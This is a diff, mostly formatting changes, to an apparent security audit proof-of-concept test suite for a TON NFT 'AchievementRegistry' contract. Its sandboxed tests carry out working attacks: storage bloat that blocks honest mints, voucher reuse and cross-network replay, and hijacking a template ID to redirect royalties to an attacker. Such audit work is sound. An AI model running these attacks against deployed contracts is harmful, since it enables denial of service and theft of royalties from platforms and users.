@@ -43,9 +43,16 @@ describe('AchievementRegistry PoC', () => {
     let farFuture: bigint;
 
     async function deployRegistry(bc: Blockchain, ownerAddr: Address) {
-        const collectionContent = beginCell().storeUint(1, 8).storeStringTail('https://achivator.cc/collection.json').endCell();
+        const collectionContent = beginCell()
+            .storeUint(1, 8)
+            .storeStringTail('https://achivator.cc/collection.json')
+            .endCell();
         const r = bc.openContract(
-            await AchievementRegistry.fromInit(ownerAddr, BigInt('0x' + backend.publicKey.toString('hex')), collectionContent),
+            await AchievementRegistry.fromInit(
+                ownerAddr,
+                BigInt('0x' + backend.publicKey.toString('hex')),
+                collectionContent,
+            ),
         );
         return r;
     }
@@ -59,7 +66,9 @@ describe('AchievementRegistry PoC', () => {
 
     function mintMsg(target: Address, templateId: bigint, recipient: Address, tgUserId: bigint, nonce: bigint) {
         const voucherCell = beginCell()
-            .store(storeMintVoucher({ $$type: 'MintVoucher', templateId, recipient, tgUserId, nonce, expiry: farFuture }))
+            .store(
+                storeMintVoucher({ $$type: 'MintVoucher', templateId, recipient, tgUserId, nonce, expiry: farFuture }),
+            )
             .endCell();
         return {
             $$type: 'MintAchievement' as const,
@@ -69,7 +78,13 @@ describe('AchievementRegistry PoC', () => {
     }
 
     // RegisterTemplate built by hand so contentUrl can be an arbitrary cell.
-    function rawRegisterBody(contentUrl: Cell, v: { voucherCell: Cell; signature: Cell }, royaltyTo: Address, num = 5n, den = 100n) {
+    function rawRegisterBody(
+        contentUrl: Cell,
+        v: { voucherCell: Cell; signature: Cell },
+        royaltyTo: Address,
+        num = 5n,
+        den = 100n,
+    ) {
         return beginCell()
             .storeUint(OP_REGISTER, 32)
             .storeRef(contentUrl)
@@ -117,7 +132,9 @@ describe('AchievementRegistry PoC', () => {
                 body: rawRegisterBody(url, v, attacker.address),
             });
             const after = (await blockchain.getContract(attacker.address)).balance;
-            const tx = res.transactions.find((t) => t.inMessage?.info.dest?.toString() === registry.address.toString())!;
+            const tx = res.transactions.find(
+                (t) => t.inMessage?.info.dest?.toString() === registry.address.toString(),
+            )!;
             const d: any = tx.description;
             const ok = d.computePhase.type === 'vm' && d.computePhase.success && d.actionPhase?.success;
             const c = await cells(blockchain, registry.address);
@@ -131,12 +148,25 @@ describe('AchievementRegistry PoC', () => {
         }
         // top off greedily with smaller junk so the remaining room is < 4 cells
         async function tryReg(k: number) {
-            const url = k > 0
-                ? beginCell().storeBuffer(Buffer.from('https://e.x/')).storeRef(beginCell().endCell()).storeRef(junkTree(k)).endCell()
-                : beginCell().storeBuffer(Buffer.from('https://e.x/' + uniq++)).endCell();
+            const url =
+                k > 0
+                    ? beginCell()
+                          .storeBuffer(Buffer.from('https://e.x/'))
+                          .storeRef(beginCell().endCell())
+                          .storeRef(junkTree(k))
+                          .endCell()
+                    : beginCell()
+                          .storeBuffer(Buffer.from('https://e.x/' + uniq++))
+                          .endCell();
             const before = (await blockchain.getContract(attacker.address)).balance;
-            const res = await attacker.send({ to: registry.address, value: toNano('0.1'), body: rawRegisterBody(url, v, attacker.address) });
-            const d: any = res.transactions.find((t) => t.inMessage?.info.dest?.toString() === registry.address.toString())!.description;
+            const res = await attacker.send({
+                to: registry.address,
+                value: toNano('0.1'),
+                body: rawRegisterBody(url, v, attacker.address),
+            });
+            const d: any = res.transactions.find(
+                (t) => t.inMessage?.info.dest?.toString() === registry.address.toString(),
+            )!.description;
             attackerSpent += before - (await blockchain.getContract(attacker.address)).balance;
             return d.computePhase.success && d.actionPhase?.success;
         }
@@ -144,7 +174,9 @@ describe('AchievementRegistry PoC', () => {
             while (await tryReg(k)) {}
         }
         const filled = await cells(blockchain, registry.address);
-        console.log(`registry cells before attack=${base}, after top-off=${filled}; attacker total cost=${Number(attackerSpent) / 1e9} TON`);
+        console.log(
+            `registry cells before attack=${base}, after top-off=${filled}; attacker total cost=${Number(attackerSpent) / 1e9} TON`,
+        );
         expect(filled).toBeGreaterThan(65530);
 
         // the bloated template reads back fine in FunC but breaks the TS String decoder
@@ -154,22 +186,46 @@ describe('AchievementRegistry PoC', () => {
         const honest = await admin.send({
             to: registry.address,
             value: toNano('0.2'),
-            body: rawRegisterBody(beginCell().storeStringTail(URL).endCell(), regVoucher(admin.address, registry.address), admin.address),
+            body: rawRegisterBody(
+                beginCell().storeStringTail(URL).endCell(),
+                regVoucher(admin.address, registry.address),
+                admin.address,
+            ),
         });
-        const htx: any = honest.transactions.find((t) => t.inMessage?.info.src?.toString() === admin.address.toString() && t.inMessage?.info.dest?.toString() === registry.address.toString())!.description;
-        console.log('honest register: compute', htx.computePhase.success, 'action', htx.actionPhase?.success, htx.actionPhase?.resultCode);
+        const htx: any = honest.transactions.find(
+            (t) =>
+                t.inMessage?.info.src?.toString() === admin.address.toString() &&
+                t.inMessage?.info.dest?.toString() === registry.address.toString(),
+        )!.description;
+        console.log(
+            'honest register: compute',
+            htx.computePhase.success,
+            'action',
+            htx.actionPhase?.success,
+            htx.actionPhase?.resultCode,
+        );
         expect(htx.actionPhase?.success).toBe(false);
 
         // honest mints: at most one squeezes into the leftover room, then every mint fails forever
         let okMints = 0;
         let lastCode = 0;
         for (let i = 0; i < 5; i++) {
-            const mint = await registry.send(member.getSender(), { value: toNano('0.2') }, mintMsg(registry.address, 0n, member.address, 42n + BigInt(i), 1n + BigInt(i)));
-            const mtx: any = mint.transactions.find((t) => t.inMessage?.info.src?.toString() === member.address.toString() && t.inMessage?.info.dest?.toString() === registry.address.toString())!.description;
+            const mint = await registry.send(
+                member.getSender(),
+                { value: toNano('0.2') },
+                mintMsg(registry.address, 0n, member.address, 42n + BigInt(i), 1n + BigInt(i)),
+            );
+            const mtx: any = mint.transactions.find(
+                (t) =>
+                    t.inMessage?.info.src?.toString() === member.address.toString() &&
+                    t.inMessage?.info.dest?.toString() === registry.address.toString(),
+            )!.description;
             if (mtx.actionPhase?.success) okMints++;
             else lastCode = mtx.actionPhase?.resultCode;
         }
-        console.log(`honest mints succeeded=${okMints}/5, failure action code=${lastCode}, cells=${await cells(blockchain, registry.address)}`);
+        console.log(
+            `honest mints succeeded=${okMints}/5, failure action code=${lastCode}, cells=${await cells(blockchain, registry.address)}`,
+        );
         expect(okMints).toBeLessThanOrEqual(1);
         expect(lastCode).toBe(50);
     }, 600_000);
@@ -177,13 +233,17 @@ describe('AchievementRegistry PoC', () => {
     it('AR-2: measures state growth per template and per mint (legit traffic also reaches the 65536-cell cap)', async () => {
         const v = regVoucher(admin.address, registry.address);
         const c0 = await cells(blockchain, registry.address);
-        await registry.send(admin.getSender(), { value: toNano('0.2') }, {
-            $$type: 'RegisterTemplate',
-            contentUrl: 'https://achivator.cc/metadata/items/v1/' + 'a'.repeat(150) + '.json',
-            contentHash: 1n,
-            royalty: { $$type: 'RoyaltyParams', numerator: 5n, denominator: 100n, destination: admin.address },
-            ...v,
-        });
+        await registry.send(
+            admin.getSender(),
+            { value: toNano('0.2') },
+            {
+                $$type: 'RegisterTemplate',
+                contentUrl: 'https://achivator.cc/metadata/items/v1/' + 'a'.repeat(150) + '.json',
+                contentHash: 1n,
+                royalty: { $$type: 'RoyaltyParams', numerator: 5n, denominator: 100n, destination: admin.address },
+                ...v,
+            },
+        );
         const c1 = await cells(blockchain, registry.address);
         const N = 200;
         for (let i = 0; i < N; i++) {
@@ -196,20 +256,26 @@ describe('AchievementRegistry PoC', () => {
         }
         const c2 = await cells(blockchain, registry.address);
         const perMint = (c2 - c1) / N;
-        console.log(`cells: base=${c0} +template=${c1 - c0} perMint=${perMint.toFixed(2)} => mints until 65536 ~ ${Math.floor((65536 - c2) / perMint)}`);
+        console.log(
+            `cells: base=${c0} +template=${c1 - c0} perMint=${perMint.toFixed(2)} => mints until 65536 ~ ${Math.floor((65536 - c2) / perMint)}`,
+        );
         expect(perMint).toBeGreaterThan(1.5);
     }, 600_000);
 
     it('AR-3: a RegisterVoucher has no nonce: one voucher registers unlimited templates until expiry', async () => {
         const v = regVoucher(admin.address, registry.address);
         for (let i = 0; i < 5; i++) {
-            const r = await registry.send(admin.getSender(), { value: toNano('0.1') }, {
-                $$type: 'RegisterTemplate',
-                contentUrl: URL,
-                contentHash: 1n,
-                royalty: { $$type: 'RoyaltyParams', numerator: 5n, denominator: 100n, destination: admin.address },
-                ...v,
-            });
+            const r = await registry.send(
+                admin.getSender(),
+                { value: toNano('0.1') },
+                {
+                    $$type: 'RegisterTemplate',
+                    contentUrl: URL,
+                    contentHash: 1n,
+                    royalty: { $$type: 'RoyaltyParams', numerator: 5n, denominator: 100n, destination: admin.address },
+                    ...v,
+                },
+            );
             expect(r.transactions).toHaveTransaction({ from: admin.address, to: registry.address, success: true });
         }
         expect(await registry.getTemplatesCount()).toEqual(5n);
@@ -228,11 +294,17 @@ describe('AchievementRegistry PoC', () => {
         expect(tReg.address.equals(registry.address)).toBe(true);
 
         // mainnet: platform template 0 is "rare" achievement; testnet: whatever
-        await registry.send(admin.getSender(), { value: toNano('0.2') }, {
-            $$type: 'RegisterTemplate', contentUrl: 'https://achivator.cc/mainnet-rare.json', contentHash: 1n,
-            royalty: { $$type: 'RoyaltyParams', numerator: 5n, denominator: 100n, destination: admin.address },
-            ...regVoucher(admin.address, registry.address),
-        });
+        await registry.send(
+            admin.getSender(),
+            { value: toNano('0.2') },
+            {
+                $$type: 'RegisterTemplate',
+                contentUrl: 'https://achivator.cc/mainnet-rare.json',
+                contentHash: 1n,
+                royalty: { $$type: 'RoyaltyParams', numerator: 5n, denominator: 100n, destination: admin.address },
+                ...regVoucher(admin.address, registry.address),
+            },
+        );
 
         // a testnet mint voucher (testnet backend is lax / test data) for template 0
         const testnetVoucher = mintMsg(tReg.address, 0n, member.address, 555n, 1n);
@@ -251,21 +323,37 @@ describe('AchievementRegistry PoC', () => {
         await attacker.send({
             to: registry.address,
             value: toNano('0.1'),
-            body: rawRegisterBody(beginCell().storeStringTail('https://evil.example/fake.json').endCell(), regVoucher(attacker.address, registry.address), attacker.address, 100n, 100n),
+            body: rawRegisterBody(
+                beginCell().storeStringTail('https://evil.example/fake.json').endCell(),
+                regVoucher(attacker.address, registry.address),
+                attacker.address,
+                100n,
+                100n,
+            ),
         });
         // platform registration
-        await registry.send(admin.getSender(), { value: toNano('0.2') }, {
-            $$type: 'RegisterTemplate', contentUrl: URL, contentHash: 1n,
-            royalty: { $$type: 'RoyaltyParams', numerator: 5n, denominator: 100n, destination: admin.address },
-            ...regVoucher(admin.address, registry.address, 0n),
-        });
+        await registry.send(
+            admin.getSender(),
+            { value: toNano('0.2') },
+            {
+                $$type: 'RegisterTemplate',
+                contentUrl: URL,
+                contentHash: 1n,
+                royalty: { $$type: 'RoyaltyParams', numerator: 5n, denominator: 100n, destination: admin.address },
+                ...regVoucher(admin.address, registry.address, 0n),
+            },
+        );
         // script's wait loop: count != expectedId -> "confirmed", records type -> expectedId
         expect(await registry.getTemplatesCount()).not.toEqual(expectedId);
         const mapped = (await registry.getTemplate(expectedId))!;
         expect(mapped.creator.equals(attacker.address)).toBe(true);
         expect(mapped.royalty.numerator).toEqual(mapped.royalty.denominator);
         // backend now signs platform mints for the attacker's template
-        await registry.send(member.getSender(), { value: toNano('0.2') }, mintMsg(registry.address, expectedId, member.address, 7n, 1n));
+        await registry.send(
+            member.getSender(),
+            { value: toNano('0.2') },
+            mintMsg(registry.address, expectedId, member.address, 7n, 1n),
+        );
         const item = blockchain.openContract(AchievementItem.fromAddress(await registry.getNftAddress(0n)));
         const r = await item.getGetRoyaltyParams();
         expect(r.destination.equals(attacker.address)).toBe(true);
@@ -273,11 +361,17 @@ describe('AchievementRegistry PoC', () => {
     });
 
     it('AR-INFO: a leaked mint voucher can be submitted by anyone; the NFT still goes to the signed recipient', async () => {
-        await registry.send(admin.getSender(), { value: toNano('0.2') }, {
-            $$type: 'RegisterTemplate', contentUrl: URL, contentHash: 1n,
-            royalty: { $$type: 'RoyaltyParams', numerator: 5n, denominator: 100n, destination: admin.address },
-            ...regVoucher(admin.address, registry.address),
-        });
+        await registry.send(
+            admin.getSender(),
+            { value: toNano('0.2') },
+            {
+                $$type: 'RegisterTemplate',
+                contentUrl: URL,
+                contentHash: 1n,
+                royalty: { $$type: 'RoyaltyParams', numerator: 5n, denominator: 100n, destination: admin.address },
+                ...regVoucher(admin.address, registry.address),
+            },
+        );
         const m = mintMsg(registry.address, 0n, member.address, 9n, 1n);
         const fr = await registry.send(attacker.getSender(), { value: toNano('0.2') }, m);
         expect(fr.transactions).toHaveTransaction({ from: attacker.address, to: registry.address, success: true });
